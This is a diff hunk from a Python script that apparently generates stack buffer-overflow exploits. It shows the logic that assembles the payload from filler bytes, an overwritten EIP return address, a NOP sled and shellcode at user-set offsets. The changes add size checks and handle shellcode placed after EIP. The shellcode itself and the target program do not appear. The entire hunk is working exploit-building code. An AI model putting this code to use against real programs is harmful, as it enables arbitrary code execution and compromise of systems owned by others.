@@ -157,16 +157,25 @@ if __name__ == '__main__':
 
 
 		if(args.offsetEIP + 4 == args.shellcodeOffset):
-			buffer += b'A'*args.offsetEIP + eip + b'A'*(args.offsetEIP - args.shellcodeOffset + 4) + nop*nops + shellcode + b'A'*(args.len - args.offsetEIP - 4 - len(shellcode)-nops)
+			if(args.shellcodeOffset + len(shellcode)>args.len):
+				print('shellcode too large for buffer. use smaller shellcode or increase value of LEN')
+				sys.exit(1)
+			else:
+				buffer += b'A'*args.offsetEIP + eip + nop*nops + shellcode + b'A'*(args.len - args.offsetEIP - 4 - len(shellcode)-nops)
 		elif(args.offsetEIP + 4 > args.shellcodeOffset):
 			if(len(shellcode)+args.shellcodeOffset < args.offsetEIP):
 				buffer += b'A'*(args.shellcodeOffset)+nop*nops+shellcode+b'A'*(args.offsetEIP - nops - args.shellcodeOffset - len(shellcode)) + eip + b'A'*(args.len - args.offsetEIP - 4)
 			else:
 				print('shellcode too big to fit before EIP! exiting...')
 				sys.exit(1)
-		else:
-			print('it seems your offsets are off...try again or report a bug if you are sure...')
-			sys.exit(1)
+		elif(args.offsetEIP + 4 < args.shellcodeOffset):
+			if(args.shellcodeOffset + len(shellcode) > args.len):
+				print('shellcode too large for buffer. use smaller shellcode or increase value of LEN')
+				sys.exit(1)
+			else:
+				buffer += b'A'*args.offsetEIP + eip + b'A'*(args.shellcodeOffset-args.offsetEIP-4)+nop*nops+shellcode+b'A'*(args.len-nops-len(shellcode)-args.shellcodeOffset)
+
+
 
 		if(args.post_command != None):
 			if(args.post_command[0:2]=='0x'):
